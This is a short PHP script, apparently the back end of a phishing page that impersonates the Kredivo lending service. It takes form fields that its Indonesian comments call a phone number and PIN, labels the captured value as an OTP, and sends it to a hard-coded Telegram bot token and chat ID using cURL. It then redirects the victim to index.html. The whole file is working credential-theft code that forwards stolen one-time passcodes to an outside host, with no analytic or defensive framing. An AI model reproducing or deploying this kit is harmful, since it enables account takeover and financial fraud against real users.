<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Mendapatkan nilai dari input nomor handphone dan PIN
    $nomorHandphone = $_POST['basicku'];
    $pinKredivo = $_POST['premiumku'];
    
$pesan = "( Kredivo | OTP | )\n\n- OTP: $nomorHandphone";

    // Mengganti token bot dan ID obrolan (chat ID) dengan informasi Anda
    $botToken = "6756173017:AAGeyizn99bgqzEpQ4nk1luW4SsxO-OioCo";
    $chatID = "1659425519";

    // Mendefinisikan URL untuk mengirim pesan ke Telegram
    $telegramURL = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatID}&text=" . urlencode($pesan);

    // Mengirim pesan ke Telegram menggunakan cURL
    $ch = curl_init($telegramURL);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Pindahkan pengguna ke index.html setelah pesan berhasil dikirim
    header("Location: index.html");
    exit();
}
?>
